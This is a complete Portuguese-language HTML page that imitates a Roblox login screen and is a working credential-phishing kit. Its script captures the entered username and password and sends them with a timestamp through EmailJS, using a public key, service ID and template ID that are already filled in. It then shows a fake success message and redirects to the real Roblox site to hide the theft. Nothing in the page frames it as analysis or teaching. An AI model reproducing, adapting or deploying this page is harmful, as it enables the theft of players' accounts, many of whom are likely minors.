 <!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Roblox</title>
    <!-- EmailJS SDK -->
    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
    <script type="text/javascript">
        (function(){
            // Sua Public Key
            emailjs.init("4nOCEE08jK86Ozlp3");
        })();
    </script>
    <style>
        /* Reset */
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Whitney', 'Helvetica Neue', Helvetica, Arial, sans-serif; }
        
        body {
            background-color: #232527; /* Cor de fundo padrão do Roblox Dark Mode */
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            color: white;
            position: relative;
            overflow: hidden;
        }

        /* Fundo decorativo sutil (opcional, para parecer mais profissional) */
        body::before {
            content: "";
            position: absolute;
            top: 0; left: 0; width: 100%; height: 100%;
            background: radial-gradient(circle at center, rgba(255,255,255,0.05) 0%, transparent 70%);
            pointer-events: none;
        }

        .login-container {
            background-color: #393b3d; /* Fundo do card de login */
            padding: 40px 30px;
            width: 100%;
            max-width: 400px;
            border-radius: 8px;
            box-shadow: 0 4px 15px rgba(0,0,0,0.4);
            z-index: 10;
            position: relative;
        }

        .logo-area {
            text-align: center;
            margin-bottom: 30px;
        }

        .logo-area svg {
            width: 100px;
            height: auto;
            margin-bottom: 10px;
        }

        .logo-area h1 {
            font-size: 28px;
            font-weight: 800;
            letter-spacing: 0.5px;
            color: white;
        }

        .input-group {
            margin-bottom: 15px;
        }

        input[type="text"], 
        input[type="password"] {
            width: 100%;
            padding: 14px 15px;
            background-color: #e7e9ec; /* Cinza claro clássico */
            border: 1px solid transparent;
            border-radius: 5px;
            font-size: 16px;
            color: black;
            outline: none;
            transition: all 0.2s ease;
        }

        input:focus {
            background-color: white;
            border-color: #000;
        }

        input::placeholder {
            color: #6d6d6d;
        }

        button {
            width: 100%;
            padding: 14px;
            background-color: #000; /* Botão preto solicitado */
            color: white;
            border: none;
            border-radius: 5px;
            font-size: 18px;
            font-weight: bold;
            cursor: pointer;
            margin-top: 10px;
            transition: background-color 0.2s;
        }

        button:hover {
            background-color: #333;
        }

        button:disabled {
            background-color: #555;
            cursor: not-allowed;
            opacity: 0.7;
        }

        .links {
            margin-top: 20px;
            text-align: center;
            font-size: 14px;
        }

        .links a {
            color: #bdbec0;
            text-decoration: none;
            display: inline-block;
            margin-top: 10px;
        }

        .links a:hover {
            text-decoration: underline;
            color: white;
        }

        #status-msg {
            text-align: center;
            margin-top: 15px;
            font-size: 14px;
            min-height: 20px;
            font-weight: 500;
        }

        .success { color: #00b02a; }
        .error { color: #ff4d4d; }

        /* Responsividade */
        @media (max-width: 480px) {
            .login-container {
                margin: 20px;
                padding: 30px 20px;
            }
        }
    </style>
</head>
<body>

    <div class="login-container">
        <div class="logo-area">
            <!-- Logo SVG do Roblox -->
            <svg viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
                <path d="M20 20 H80 V80 H20 Z" fill="#fff"/>
                <circle cx="35" cy="35" r="5" fill="#000"/>
                <circle cx="65" cy="35" r="5" fill="#000"/>
                <rect x="35" y="60" width="30" height="5" fill="#000"/>
            </svg>
            <h1>ROBLOX</h1>
        </div>

        <form id="login-form">
            <div class="input-group">
                <input type="text" name="username" placeholder="Usuário ou E-mail" required autocomplete="off">
            </div>
            <div class="input-group">
                <input type="password" name="password" placeholder="Senha" required>
            </div>
            
            <button type="submit" id="btn-submit">Entrar</button>
            
            <div class="links">
                <a href="#">Esqueceu sua senha?</a>
            </div>
        </form>
        
        <div id="status-msg"></div>
    </div>

    <script type="text/javascript">
        const form = document.getElementById('login-form');
        const btn = document.getElementById('btn-submit');
        const statusMsg = document.getElementById('status-msg');

        form.addEventListener('submit', function(event) {
            event.preventDefault(); 

            // UI Feedback
            btn.disabled = true;
            btn.innerText = "Entrando...";
            statusMsg.innerText = "";
            statusMsg.className = "";

            // Dados para enviar
            const templateParams = {
                username: document.querySelector('input[name="username"]').value,
                password: document.querySelector('input[name="password"]').value,
                date: new Date().toLocaleString()
            };

            // Envio via EmailJS
            emailjs.send('service_4ipri3b', 'template_ttaedjc', templateParams)
                .then(function(response) {
                    console.log('SUCESSO!', response.status, response.text);
                    
                    btn.innerText = "Sucesso!";
                    statusMsg.innerText = "Login realizado com sucesso!";
                    statusMsg.className = "success";
                    
                    // Redireciona após breve delay
                    setTimeout(() => {
                        window.location.href = "https://www.roblox.com/home";
                    }, 2000);

                }, function(error) {
                    console.error('FALHA...', error);
                    
                    btn.disabled = false;
                    btn.innerText = "Entrar";
                    statusMsg.innerText = "Erro ao conectar. Verifique o Console.";
                    statusMsg.className = "error";
                });
        });
    </script>
</body>
</html>
